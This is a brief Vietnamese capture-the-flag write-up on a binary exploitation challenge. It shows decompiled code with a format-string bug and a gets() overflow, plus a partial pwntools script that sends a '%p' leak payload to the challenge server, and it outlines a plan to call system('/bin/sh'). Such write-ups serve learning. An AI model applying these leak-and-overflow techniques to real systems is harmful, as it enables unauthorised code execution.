---
title: "(BKSEC TTV) Buffer Overflow — Writeup"
description: "Ta có 2 file: bof binary và lib.so.6 thực hiện disassemble và tạo pseudocode, tìm thấy hàm main: int64 fastcall main(int64 a1, char a2, char a3) { char s[32]; // [rsp+0h] [rbp-20h] BYREF"
published: "2025-08-29"
updated: "2025-08-29"
event: "BKSEC TTV"
category: "Binary Exploitation"
kind: "writeup"
status: "solved"
tags: ["Binary Exploitation", "BKSEC TTV", "Writeup"]
readingTime: 1
wordCount: 69
featured: false
sourcePath: "~/ctf/writeups/(BKSEC-TTV) Buffer_Overflow.md"
---

Ta có 2 file: bof binary và lib.so.6 
thực hiện disassemble và tạo pseudocode, tìm thấy hàm main:
```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  sub_40127E(a1, a2, a3);
  printf("Enter your name: ");
  fgets(s, 32, stdin);
  sub_401303(s);
  return 0LL;
}
```
sub_401303

```
__int64 __fastcall sub_401303(const char *a1)
{
  char v2[112]; // [rsp+10h] [rbp-70h] BYREF

  printf(a1);
  printf("Input your string: ");
  gets(v2);
  printf("Here's your string: %s", v2);
  return 0LL;
}
```
nhận thấy hàm sub có thể vulnerable với cả bufferoverflow lẫn format string, thử cả hai: 
sử dụng pwntools:
```
from pwn import *

p = remote('10.8.0.1', 5004)

#leak địa chỉ: 
p.recvuntil(b"Enter your name: ")
payload = b"%p %p %p %p %p %p %p %p"
p.sendline(payload)
print(p.recv().decode())
```
đoán mò mục tiêu là để tìm được system() và /bin/sh, do kinh nghiệm từ trước. 
sau khi tìm được địa chỉ của chúng, ta căn cho overflow vào đúng chỗ.
